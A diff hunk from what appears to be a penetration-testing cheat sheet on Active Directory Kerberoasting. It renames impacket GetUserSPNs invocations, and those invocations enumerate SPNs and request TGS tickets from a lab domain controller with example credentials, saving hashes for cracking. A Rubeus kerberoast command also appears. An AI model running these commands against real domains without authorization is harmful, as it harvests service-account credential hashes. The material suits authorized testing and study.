@@ -118,17 +118,17 @@ Rubeus.exe kerberoast /user:testspn /nowrap
 # Linux
 (GetUserSPNs) SPN enumeration
 ```bash
-impacket-GetUserSPNs.py 'medin.local/tm:Password1$' -dc-ip 172.16.105.100
+impacket-GetUserSPNs 'medin.local/tm:Password1$' -dc-ip 172.16.105.100
 ```
 (GetUserSPNs) Kerberoasting requesting all TGS tickets
 ```bash
-impacket-GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC IP> -request 
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC IP> -request 
 
-impacket-GetUserSPNs.py 'medin.local/tm:Password1$' -dc-ip 172.16.105.100 -request -outputfile krb.hash
+impacket-GetUserSPNs 'medin.local/tm:Password1$' -dc-ip 172.16.105.100 -request -outputfile krb.hash
 ```
 (GetUserSPNs) Targeted TGS ticket request
 ```bash
-impacket-GetUserSPNs.py 'medin.local/tm:Password1$' -dc-ip 172.16.105.100 -request-user sqldev -outputfile sqldev_tgs.hash
+impacket-GetUserSPNs 'medin.local/tm:Password1$' -dc-ip 172.16.105.100 -request-user sqldev -outputfile sqldev_tgs.hash
 ```
 ### Persistence
 (Rubeus) Obtained ticket information
